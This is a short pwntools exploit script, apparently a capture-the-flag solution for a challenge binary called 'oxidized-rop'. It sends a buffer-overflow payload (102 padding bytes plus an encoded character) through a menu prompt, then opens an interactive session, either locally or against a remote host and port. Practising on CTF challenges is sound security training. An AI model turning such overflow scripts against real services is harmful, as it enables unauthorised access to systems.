#!/usr/bin/env python3

from pwn import context, remote, sys

context.binary = 'oxidized-rop'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def main():
    p = get_process()

    payload = b'A' * 102 + chr(123456).encode()

    p.sendlineafter(b'Selection: ', b'1')
    p.sendlineafter(b'Statement (max 200 characters): ', payload)
    p.sendlineafter(b'Selection: ', b'2')
    p.recv()

    p.interactive()


if __name__ == '__main__':
    main()
